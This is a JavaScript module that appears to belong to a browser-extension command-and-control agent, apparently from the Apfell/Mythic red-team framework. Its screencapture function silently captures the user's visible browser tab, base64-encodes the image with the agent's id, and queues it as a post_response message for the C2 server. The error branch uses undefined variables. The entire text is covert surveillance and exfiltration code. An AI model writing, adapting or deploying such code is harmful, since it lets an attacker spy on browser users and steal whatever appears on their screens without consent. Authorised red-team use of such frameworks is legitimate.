screencapture = function(task){
    chrome.tabs.captureVisibleTab(null, function(img) {
        
        if (img === undefined) {
            C2.sendError(taskid, tasktype);
        } else {
            let encImg = img.toString().split(',')[1];
            raw = atob(encImg)
            totalchunks = raw.length / 512000
            response = {'total_chunks':totalchunks, 'task_id':task['task_id'], 'full_path':task['params']}
            outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            enc = JSON.stringify(outer_response);
            final = apfell.apfellid + enc;
            msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
            
            screencaptures.push({'type':'screencapture','task_id':task['task_id'], 'image':encImg, 'total_chunks': totalchunks});
        }

    });
};

C2.commands[screencapture.name] = screencapture;
COMMAND_ENDS_HERE
